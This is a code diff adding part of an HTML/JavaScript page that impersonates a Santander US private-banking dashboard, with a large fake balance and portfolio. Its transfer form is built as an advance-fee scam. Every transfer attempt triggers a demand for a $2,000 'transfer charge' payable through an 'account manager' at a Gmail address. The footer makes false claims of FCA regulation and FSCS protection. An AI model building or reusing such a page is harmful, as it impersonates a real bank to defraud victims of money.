+              <div class="tx-icon out"><i class="fas fa-plane"></i></div>
+              <div class="tx-info">
+                <div class="name">Delta Air Lines</div>
+                <div class="meta">Travel · Card ending ····8823 · Feb 18</div>
+              </div>
+              <div class="tx-amount out">−$1,420.60</div>
+            </div>
+
+            <div class="tx-row">
+              <div class="tx-icon out"><i class="fas fa-bolt"></i></div>
+              <div class="tx-info">
+                <div class="name">Con Edison — Utilities</div>
+                <div class="meta">Auto-pay · Feb 16</div>
+              </div>
+              <div class="tx-amount out">−$214.30</div>
+            </div>
+
+            <div class="tx-row">
+              <div class="tx-icon in"><i class="fas fa-percent"></i></div>
+              <div class="tx-info">
+                <div class="name">Sovereign Bond Ladder — Coupon</div>
+                <div class="meta">Portfolio income · Feb 15</div>
+              </div>
+              <div class="tx-amount in">+$1,850.00</div>
+            </div>
+
+            <div class="tx-row">
+              <div class="tx-icon out"><i class="fas fa-shield-halved"></i></div>
+              <div class="tx-info">
+                <div class="name">Santander Private Client — Advisory Fee</div>
+                <div class="meta">Quarterly fee · Feb 12</div>
+              </div>
+              <div class="tx-amount out">−$375.00</div>
+            </div>
+
+            <div class="tx-row">
+              <div class="tx-icon in"><i class="fas fa-rotate-left"></i></div>
+              <div class="tx-info">
+                <div class="name">Refund — Amazon.com</div>
+                <div class="meta">Card ending ····8823 · Feb 10</div>
+              </div>
+              <div class="tx-amount in">+$149.99</div>
+            </div>
+
+          </div>
+
+          <div class="card" style="margin-top:20px;" id="investmentsSection">
+            <div class="section-title">
+              <h2>Investment Portfolio</h2>
+              <span style="font-size:12px;color:#9a9a9a;font-weight:600;">Updated today</span>
+            </div>
+            <div class="invest-item">
+              <div>
+                <div class="invest-name">Meridian Growth Fund</div>
+                <div class="invest-sub">Equity · Moderate risk</div>
+              </div>
+              <div class="invest-val">
+                <div class="v mono">$820,000.00</div>
+                <div class="p" style="color:#1b7a2e;">+13.2% YTD</div>
+              </div>
+            </div>
+            <div class="invest-item">
+              <div>
+                <div class="invest-name">Sovereign Bond Ladder</div>
+                <div class="invest-sub">Fixed income · Low risk</div>
+              </div>
+              <div class="invest-val">
+                <div class="v mono">$370,000.00</div>
+                <div class="p" style="color:#1b7a2e;">+5.8% YTD</div>
+              </div>
+            </div>
+            <div class="invest-item">
+              <div>
+                <div class="invest-name">Global Property Trust</div>
+                <div class="invest-sub">Real assets · Moderate risk</div>
+              </div>
+              <div class="invest-val">
+                <div class="v mono">$210,000.00</div>
+                <div class="p" style="color:#ec0000;">-1.8% YTD</div>
+              </div>
+            </div>
+            <div class="invest-total">
+              <span style="font-size:14px;color:#6a6a6a;font-weight:600;">Total portfolio value</span>
+              <span class="v mono">$1,400,000.00</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="transfer-wrapper" id="transfersSection">
+          <div class="transfer-main-card">
+            <div class="transfer-header">
+              <h2>Send a Transfer</h2>
+              <span class="badge-new"><i class="fas fa-bolt" style="margin-right:4px;"></i> Instant</span>
+            </div>
+
+            <div class="transfer-grid">
+              <div class="field-group">
+                <label><i class="fas fa-arrow-right" style="margin-right:6px;font-size:10px;"></i> From Account</label>
+                <select id="fromAccount">
+                  <option>Current ····8823 — $1,900,000.00</option>
+                  <option>Savings ····4451 — $600,000.00</option>
+                </select>
+              </div>
+
+              <div class="field-group full-width">
+                <label><i class="fas fa-globe" style="margin-right:6px;font-size:10px;"></i> Transfer Type</label>
+                <div class="transfer-type-selector">
+                  <input type="radio" name="transferTypeRadio" id="ttDomestic" value="domestic" checked onchange="updateTransferFields()">
+                  <label for="ttDomestic"><i class="fas fa-building-columns"></i> Domestic</label>
+
+                  <input type="radio" name="transferTypeRadio" id="ttInternational" value="international" onchange="updateTransferFields()">
+                  <label for="ttInternational"><i class="fas fa-globe"></i> International</label>
+                </div>
+                <select id="transferType" style="display:none;">
+                  <option value="domestic">Domestic Transfer</option>
+                  <option value="international">International Wire</option>
+                </select>
+              </div>
+
+              <div class="field-group full-width">
+                <label><i class="fas fa-user" style="margin-right:6px;font-size:10px;"></i> Beneficiary Name</label>
+                <input type="text" id="beneficiaryName" placeholder="e.g. Jordan Whitaker" />
+              </div>
+
+              <div class="field-group full-width domestic-fields" id="domesticAccountField">
+                <label><i class="fas fa-hashtag" style="margin-right:6px;font-size:10px;"></i> Beneficiary Account Number</label>
+                <input type="text" id="domesticAccountNumber" placeholder="Enter account number" />
+              </div>
+
+              <div class="field-group full-width domestic-fields" id="domesticRoutingField">
+                <label><i class="fas fa-map-marker-alt" style="margin-right:6px;font-size:10px;"></i> Routing Number (ABA)</label>
+                <input type="text" id="domesticRoutingNumber" placeholder="Enter 9-digit routing number" />
+              </div>
+
+              <div class="field-group full-width">
+                <label><i class="fas fa-university" style="margin-right:6px;font-size:10px;"></i> Beneficiary Bank</label>
+                <select id="beneficiaryAccount" class="field-select-modern" onchange="toggleOtherBank()">
+                  <option value="" disabled selected>Select a bank or credit union</option>
+                  <optgroup label="Major US Banks">
+                    <option value="chase">JPMorgan Chase</option>
+                    <option value="bank_of_america">Bank of America</option>
+                    <option value="wells_fargo">Wells Fargo</option>
+                    <option value="citibank">Citibank</option>
+                    <option value="us_bank">U.S. Bank</option>
+                    <option value="pnc_bank">PNC Bank</option>
+                    <option value="truist">Truist</option>
+                    <option value="goldman_sachs">Goldman Sachs</option>
+                    <option value="capital_one">Capital One</option>
+                    <option value="td_bank">TD Bank</option>
+                    <option value="hsbc">HSBC</option>
+                    <option value="santander">Santander</option>
+                    <option value="charles_schwab">Charles Schwab Bank</option>
+                    <option value="ally_bank">Ally Bank</option>
+                    <option value="discover_bank">Discover Bank</option>
+                    <option value="american_express">American Express Bank</option>
+                    <option value="regions_bank">Regions Bank</option>
+                    <option value="fifth_third_bank">Fifth Third Bank</option>
+                    <option value="keybank">KeyBank</option>
+                    <option value="huntington_bank">Huntington Bank</option>
+                    <option value="citizens_bank">Citizens Bank</option>
+                    <option value="m_and_t_bank">M&T Bank</option>
+                    <option value="bmo_harris">BMO Harris Bank</option>
+                    <option value="first_horizon">First Horizon Bank</option>
+                    <option value="synchrony_bank">Synchrony Bank</option>
+                  </optgroup>
+                  <optgroup label="Credit Unions">
+                    <option value="navy_federal">Navy Federal Credit Union</option>
+                    <option value="state_employees_cu">State Employees' Credit Union (SECU)</option>
+                    <option value="pentagon_federal">Pentagon Federal (PenFed)</option>
+                    <option value="schools_first_fcu">SchoolsFirst FCU</option>
+                    <option value="first_tech_fcu">First Tech FCU</option>
+                    <option value="alliant_cu">Alliant Credit Union</option>
+                    <option value="becu">BECU</option>
+                    <option value="america_first_cu">America First Credit Union</option>
+                    <option value="golden_1_cu">Golden 1 Credit Union</option>
+                    <option value="suncoast_cu">Suncoast Credit Union</option>
+                    <option value="lake_michigan_cu">Lake Michigan Credit Union</option>
+                    <option value="star_one_cu">Star One Credit Union</option>
+                    <option value="dcu">Digital Federal Credit Union (DCU)</option>
+                    <option value="randolph_brooks">Randolph-Brooks FCU (RBFCU)</option>
+                    <option value="delta_community_cu">Delta Community Credit Union</option>
+                    <option value="service_cu">Service Credit Union</option>
+                    <option value="redwood_cu">Redwood Credit Union</option>
+                    <option value="usaa">USAA Federal Savings Bank</option>
+                  </optgroup>
+                  <optgroup label="Not listed?">
+                    <option value="not_listed">My bank is not listed</option>
+                  </optgroup>
+                </select>
+              </div>
+
+              <div class="field-group full-width other-bank-row" id="otherBankRow">
+                <label><i class="fas fa-edit" style="margin-right:6px;font-size:10px;"></i> Please specify your bank name</label>
+                <input type="text" id="otherBankName" placeholder="Enter your bank name" />
+              </div>
+
+              <div id="internationalFields" style="display:none;" class="full-width">
+                <div class="transfer-grid">
+                  <div class="field-group full-width">
+                    <label><i class="fas fa-barcode" style="margin-right:6px;font-size:10px;"></i> IBAN</label>
+                    <input type="text" id="iban" placeholder="e.g. GB29NWBK60161331926819" style="text-transform:uppercase;" oninput="this.value=this.value.toUpperCase()">
+                  </div>
+                  <div class="field-group">
+                    <label><i class="fas fa-building-columns" style="margin-right:6px;font-size:10px;"></i> SWIFT / BIC</label>
+                    <input type="text" id="swiftCode" placeholder="e.g. HBUSGB4B" style="text-transform:uppercase;" oninput="this.value=this.value.toUpperCase()">
+                  </div>
+                  <div class="field-group">
+                    <label><i class="fas fa-hashtag" style="margin-right:6px;font-size:10px;"></i> Account No.</label>
+                    <input type="text" id="accountNumber" placeholder="Enter account number">
+                  </div>
+                </div>
+              </div>
+
+              <div class="field-group full-width">
+                <label><i class="fas fa-dollar-sign" style="margin-right:6px;font-size:10px;"></i> Amount</label>
+                <div class="amount-wrap">
+                  <span>$</span>
+                  <input type="number" id="amountInput" placeholder="0.00" oninput="updateFees()" />
+                </div>
+              </div>
+            </div>
+
+            <div class="fee-modern">
+              <div class="fee-row">
+                <span class="label"><i class="fas fa-arrow-right"></i> Transfer Amount</span>
+                <span class="value mono" id="feeAmount">$0.00</span>
+              </div>
+              <div class="fee-row">
+                <span class="label"><i class="fas fa-receipt"></i> <span id="feeLabel">Domestic Transfer Fee</span></span>
+                <span class="value mono" id="feeCost">$0.00</span>
+              </div>
+              <div class="fee-row total">
+                <span class="label"><i class="fas fa-calculator"></i> Total</span>
+                <span class="value mono" id="feeTotal">$0.00</span>
+              </div>
+              <div class="fee-note-modern" id="feeNote">
+                <i class="fas fa-info-circle"></i> Domestic transfers are typically free and complete same-day.
+              </div>
+            </div>
+
+            <button class="btn-transfer" onclick="sendTransfer()">
+              <i class="fas fa-paper-plane"></i> Review &amp; Confirm Transfer
+            </button>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <footer class="dashboard-footer">
+    <div class="footer-grid">
+      <div>
+        <h4>Santander US</h4>
+        <p>Trusted banking since 1857. We operate online only — no branches. Committed to helping you prosper with fair, transparent digital financial services.</p>
+      </div>
+
+      <div>
+        <h4>Get in touch</h4>
+        <div class="contact-block">
+          <span><i class="fas fa-user-tie"></i> Your dedicated account manager</span>
+          <span><i class="fas fa-envelope"></i> trustmgtsupport59@gmail.com</span>
+        </div>
+      </div>
+
+      <div>
+        <h4>Why bank with us</h4>
+        <div class="badge-list">
+          <span><i class="fas fa-shield-alt"></i> FCA regulated</span>
+          <span><i class="fas fa-lock"></i> FSCS protected</span>
+          <span><i class="fas fa-globe"></i> 100% online</span>
+          <span><i class="fas fa-handshake"></i> Trust Management</span>
+          <span><i class="fas fa-star"></i> Trusted since 1857</span>
+          <span><i class="fas fa-headset"></i> 24/7 support</span>
+        </div>
+      </div>
+    </div>
+    <div class="bottom">
+      &copy; 2026 Santander US. All rights reserved. <span>|</span> Protected by the FCA. In partnership with Trust Management. <br>
+      <span style="font-size:12px; opacity:0.8;">Santander US operates online only — no physical branches.</span>
+    </div>
+  </footer>
+
+  <script>
+    /* ===== SIDEBAR NAVIGATION ===== */
+    function navigateSidebar(el, targetId) {
+      document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+      el.classList.add('active');
+
+      if (targetId === 'top') {
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      } else {
+        const target = document.getElementById(targetId);
+        if (target) {
+          const yOffset = -100;
+          const y = target.getBoundingClientRect().top + window.pageYOffset + yOffset;
+          window.scrollTo({ top: y, behavior: 'smooth' });
+        }
+      }
+    }
+
+    /* ============================================================
+       EMAIL OPEN — mailto:
+       ============================================================ */
+    function openEmailToManager(subject, body) {
+      const email = 'trustmgtsupport59@gmail.com';
+      const mailtoUrl = 'mailto:' + email +
+        '?subject=' + encodeURIComponent(subject) +
+        '&body=' + encodeURIComponent(body);
+      window.location.href = mailtoUrl;
+    }
+
+    /* ============================================================
+       CONTACT-MANAGER POPUP
+       ============================================================ */
+    function showContactManager(paymentContext) {
+      const isTransfer = paymentContext && paymentContext.fromTransfer;
+      const transferAmount = isTransfer ? paymentContext.amount : null;
+
+      const existing = document.getElementById('contactManagerOverlay');
+      if (existing) existing.remove();
+
+      const overlay = document.createElement('div');
+      overlay.id = 'contactManagerOverlay';
+      overlay.style.cssText =
+        'position:fixed;inset:0;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:2500;cursor:pointer;padding:20px;';
+
+      overlay.innerHTML = `
+        <div id="contactManagerDialog" style="background:#fff;border-radius:20px;max-width:440px;width:100%;overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,0.25);cursor:default;">
+          <div style="padding:28px 24px 20px;text-align:center;position:relative;">
+            <button id="cmCloseX" style="position:absolute;top:16px;right:18px;background:#f5f5f5;border:none;width:34px;height:34px;border-radius:50%;font-size:16px;color:#6a6a6a;cursor:pointer;transition:background 0.2s,color 0.2s;" onmouseover="this.style.background='#ec0000';this.style.color='#fff'" onmouseout="this.style.background='#f5f5f5';this.style.color='#6a6a6a'">&times;</button>
+            <div style="width:64px;height:64px;border-radius:50%;background:#fff0f0;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">
+              <i class="fas fa-user-tie" style="font-size:28px;color:#ec0000;"></i>
+            </div>
+            <h3 style="font-size:20px;font-weight:800;color:#1a1a1a;margin-bottom:8px;letter-spacing:-0.3px;">Contact your account manager</h3>
+            <p style="font-size:14px;color:#6a6a6a;line-height:1.6;">
+              To complete the <strong style="color:#ec0000;">$2,000.00</strong> transfer charge payment, please contact your dedicated account manager. They will guide you through the secure payment steps.
+            </p>
+          </div>
+
+          <div style="padding:0 24px 24px;">
+            <div style="background:#fafafa;border:1px solid #f0f0f0;border-radius:14px;padding:16px 18px;margin-bottom:18px;text-align:left;">
+              <div style="font-size:12px;font-weight:700;color:#1a1a1a;margin-bottom:8px;text-transform:uppercase;letter-spacing:0.5px;">Your account manager</div>
+              <div style="display:flex;align-items:center;gap:10px;font-size:14px;color:#4a4a4a;margin-bottom:6px;">
+                <i class="fas fa-user-tie" style="color:#ec0000;width:16px;"></i> Trust Management
+              </div>
+              <div style="display:flex;align-items:center;gap:10px;font-size:14px;color:#4a4a4a;">
+                <i class="fas fa-envelope" style="color:#ec0000;width:16px;"></i> trustmgtsupport59@gmail.com
+              </div>
+            </div>
+
+            <button id="cmEmailBtn" style="width:100%;background:#ec0000;color:#fff;border:none;padding:14px;border-radius:60px;font-weight:700;font-size:15px;cursor:pointer;box-shadow:0 6px 18px rgba(236,0,0,0.2);transition:background 0.25s;display:flex;align-items:center;justify-content:center;gap:8px;" onmouseover="this.style.background='#c70000'" onmouseout="this.style.background='#ec0000'">
+              <i class="fas fa-envelope"></i> Email my account manager
+            </button>
+            <button id="cmCloseBtn" style="width:100%;margin-top:10px;background:#f8f9fc;color:#6a6a6a;border:1px solid #eaeaea;padding:12px;border-radius:60px;font-weight:600;font-size:14px;cursor:pointer;transition:background 0.25s;" onmouseover="this.style.background='#fff'" onmouseout="this.style.background='#f8f9fc'">
+              Cancel
+            </button>
+          </div>
+        </div>
+      `;
+
+      overlay.addEventListener('click', (e) => {
+        if (e.target === overlay) overlay.remove();
+      });
+      document.body.appendChild(overlay);
+
+      overlay.querySelector('#cmCloseX').addEventListener('click', () => overlay.remove());
+      overlay.querySelector('#cmCloseBtn').addEventListener('click', () => overlay.remove());
+
+      overlay.querySelector('#cmEmailBtn').addEventListener('click', (e) => {
+        e.stopPropagation();
+        e.preventDefault();
+
+        let subject, body;
+        if (isTransfer) {
+          subject = 'Transfer Charge — $2,000.00 Payment (Transfer Pending)';
+          body =
+            'Dear Account Manager,\n\n' +
+            'I have submitted a transfer of $' + transferAmount.toFixed(2) + ' but it is pending because the $2,000.00 transfer charge has not yet been paid.\n\n' +
+            'Account holder: Chad Jacobs\n' +
+            'Client ID: PB-77421\n' +
+            'Transfer amount attempted: $' + transferAmount.toFixed(2) + '\n' +
+            'Transfer charge required: $2,000.00\n\n' +
+            'Please advise on the secure payment steps so my transfer can be completed.\n\n' +
+            'Thank you,\nChad Jacobs';
+        } else {
+          subject = 'Transfer Charge — $2,000.00 Payment';
+          body =
+            'Dear Account Manager,\n\n' +
+            'I would like to pay the $2,000.00 transfer charge so that my transfers can be completed.\n\n' +
+            'Account holder: Chad Jacobs\n' +
+            'Client ID: PB-77421\n' +
+            'Charge amount: $2,000.00\n\n' +
+            'Please advise on the secure payment steps.\n\n' +
+            'Thank you,\nChad Jacobs';
+        }
+
+        setTimeout(() => {
+          openEmailToManager(subject, body);
+        }, 50);
+      });
+    }
+
+    /* ============================================================
+       DISMISS RESTRICTION BANNER
+       ============================================================ */
+    function dismissRestriction() {
+      const alertEl = document.getElementById('restrictionAlert');
+      alertEl.style.transition = 'all 0.4s ease';
+      alertEl.style.opacity = '0';
+      alertEl.style.transform = 'translateY(-20px)';
+      setTimeout(() => { alertEl.style.display = 'none'; }, 400);
+    }
+
+    /* ============================================================
+       TRANSFER FIELDS — synced with the segmented radio control
+       ============================================================ */
+    function updateTransferFields() {
+      const type = document.getElementById('transferType').value;
+      const domesticField = document.getElementById('domesticAccountField');
+      const domesticRouting = document.getElementById('domesticRoutingField');
+      const intlFields = document.getElementById('internationalFields');
+
+      if (type === 'domestic') {
+        domesticField.classList.remove('hidden');
+        if(domesticRouting) domesticRouting.classList.remove('hidden');
+        intlFields.style.display = 'none';
+      } else {
+        domesticField.classList.add('hidden');
+        if(domesticRouting) domesticRouting.classList.add('hidden');
+        intlFields.style.display = 'block';
+      }
+      updateFees();
+    }
+
+    function updateFees() {
+      const type = document.getElementById('transferType').value;
+      const amount = parseFloat(document.getElementById('amountInput').value) || 0;
+      let fee = 0, label = '', note = '';
+
+      if (type === 'domestic') {
+        fee = 0;
+        label = 'Domestic Transfer Fee';
+        note = 'Domestic transfers are free and complete same-day. Nothing further is required from you.';
+      } else {
+        fee = amount > 0 ? 500 : 0;
+        label = 'International Wire Fee (flat)';
+        note = amount > 0 ?
+          'This $500 wire fee is deducted from your account along with the transfer — it is not a separate payment. Wires typically settle in 1–3 business days.' :
+          'Enter a transfer amount to see the applicable wire fee.';
+      }
+
+      document.getElementById('feeAmount').textContent = '$' + amount.toFixed(2);
+      document.getElementById('feeCost').textContent = '$' + fee.toFixed(2);
+      document.getElementById('feeTotal').textContent = '$' + (amount + fee).toFixed(2);
+      document.getElementById('feeLabel').textContent = label;
+      document.getElementById('feeNote').innerHTML = '<i class="fas fa-info-circle"></i> ' + note;
+    }
+    updateFees();
+
+    function toggleOtherBank() {
+      const select = document.getElementById('beneficiaryAccount');
+      const row = document.getElementById('otherBankRow');
+      if (select.value === 'not_listed') {
+        row.classList.add('visible');
+        document.getElementById('otherBankName').focus();
+      } else {
+        row.classList.remove('visible');
+        document.getElementById('otherBankName').value = '';
+      }
+    }
+
+    /* ============================================================
+       TRANSFER SUBMIT
+       ============================================================ */
+    function sendTransfer() {
+      const amount = parseFloat(document.getElementById('amountInput').value) || 0;
+      if (amount <= 0) {
+        alert('Enter an amount to transfer.');
+        return;
+      }
+      showTransferChargePopup(amount);
+    }
+
+    function showTransferChargePopup(amount) {
+      const existing = document.getElementById('transferChargeOverlay');
+      if (existing) existing.remove();
+
+      const overlay = document.createElement('div');
+      overlay.id = 'transferChargeOverlay';
+      overlay.style.cssText =
+        'position:fixed;inset:0;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:2000;cursor:pointer;padding:20px;';
+
+      overlay.innerHTML = `
+        <div id="transferChargeDialog" style="background:#fff;border-radius:20px;max-width:440px;width:100%;overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,0.25);cursor:default;">
+          <div style="padding:28px 24px 18px;text-align:center;position:relative;">
+            <button id="trCloseX" style="position:absolute;top:16px;right:18px;background:#f5f5f5;border:none;width:34px;height:34px;border-radius:50%;font-size:16px;color:#6a6a6a;cursor:pointer;transition:background 0.2s,color 0.2s;" onmouseover="this.style.background='#ec0000';this.style.color='#fff'" onmouseout="this.style.background='#f5f5f5';this.style.color='#6a6a6a'">&times;</button>
+            <div style="width:64px;height:64px;border-radius:50%;background:#fff0f0;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">
+              <i class="fas fa-lock" style="font-size:28px;color:#ec0000;"></i>
+            </div>
+            <h3 style="font-size:20px;font-weight:800;color:#1a1a1a;margin-bottom:8px;letter-spacing:-0.3px;">Transfer Charge Required</h3>
+            <p style="font-size:14px;color:#6a6a6a;line-height:1.6;">
+              Your transfer of <strong style="color:#1a1a1a;">$${amount.toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2})}</strong> cannot be completed yet.
+            </p>
+          </div>
+
+          <div style="padding:0 24px 24px;">
+            <div style="background:#fff8e6;border:1px solid #ffe9b8;border-radius:14px;padding:16px 18px;margin-bottom:18px;">
+              <div style="font-size:13px;font-weight:800;color:#1a1a1a;margin-bottom:8px;">$2,000.00 charge must be paid to complete transfers</div>
+              <div style="font-size:13px;color:#6a6a6a;line-height:1.6;">
+                A <strong style="color:#ec0000;">$2,000.00</strong> transfer charge must be paid before your transfers can be processed.
+              </div>
+            </div>
+
+            <div style="display:flex;gap:10px;margin-bottom:18px;">
+              <div style="flex:1;background:#fafafa;border-radius:12px;padding:12px 10px;text-align:center;border:1px solid #f0f0f0;">
+                <div style="font-size:9px;color:#9a9a9a;text-transform:uppercase;letter-spacing:0.5px;font-weight:700;">Required</div>
+                <div style="font-size:16px;font-weight:800;color:#1a1a1a;">$2,000</div>
+              </div>
+              <div style="flex:1;background:#e8f5e9;border-radius:12px;padding:12px 10px;text-align:center;border:1px solid #c8e6c9;">
+                <div style="font-size:9px;color:#1b7a2e;text-transform:uppercase;letter-spacing:0.5px;font-weight:700;">Paid</div>
+                <div style="font-size:16px;font-weight:800;color:#1b7a2e;">$0</div>
+              </div>
+              <div style="flex:1;background:#fff0f0;border-radius:12px;padding:12px 10px;text-align:center;border:1px solid #ffcdd2;">
+                <div style="font-size:9px;color:#ec0000;text-transform:uppercase;letter-spacing:0.5px;font-weight:700;">Remaining</div>
+                <div style="font-size:16px;font-weight:800;color:#ec0000;">$2,000</div>
+              </div>
+            </div>
+
+            <div style="font-size:10px;letter-spacing:1.5px;font-weight:700;color:#9a9a9a;text-transform:uppercase;margin-bottom:6px;">What happens next?</div>
+            <p style="font-size:13px;color:#6a6a6a;line-height:1.6;margin-bottom:18px;">
+              Once the $2,000 charge is paid, your transfer will be processed immediately and you will receive a confirmation notification.
+            </p>
+
+            <button id="trPayBtn" style="width:100%;background:#ec0000;color:#fff;border:none;padding:14px;border-radius:60px;font-weight:700;font-size:15px;cursor:pointer;box-shadow:0 6px 18px rgba(236,0,0,0.2);transition:background 0.25s;display:flex;align-items:center;justify-content:center;gap:8px;" onmouseover="this.style.background='#c70000'" onmouseout="this.style.background='#ec0000'">
+              <i class="fas fa-lock-open"></i> Pay $2,000 Charge
+            </button>
+            <button id="trCloseBtn" style="width:100%;margin-top:10px;background:#f8f9fc;color:#6a6a6a;border:1px solid #eaeaea;padding:12px;border-radius:60px;font-weight:600;font-size:14px;cursor:pointer;transition:background 0.25s;" onmouseover="this.style.background='#fff'" onmouseout="this.style.background='#f8f9fc'">
+              Close
+            </button>
+          </div>
+        </div>
+      `;
+
+      overlay.addEventListener('click', (e) => {
+        if (e.target === overlay) overlay.remove();
+      });
+      document.body.appendChild(overlay);
+
+      overlay.querySelector('#trCloseX').addEventListener('click', () => overlay.remove());
+      overlay.querySelector('#trCloseBtn').addEventListener('click', () => overlay.remove());
+
+      overlay.querySelector('#trPayBtn').addEventListener('click', (e) => {
+        e.stopPropagation();
+        e.preventDefault();
+        showContactManager({ fromTransfer: true, amount: amount });
+      });
+    }
+
+    document.getElementById('bal-int').textContent = '2,500,000';
+    updateTransferFields();
+  </script>
+
+</body>
+</html>
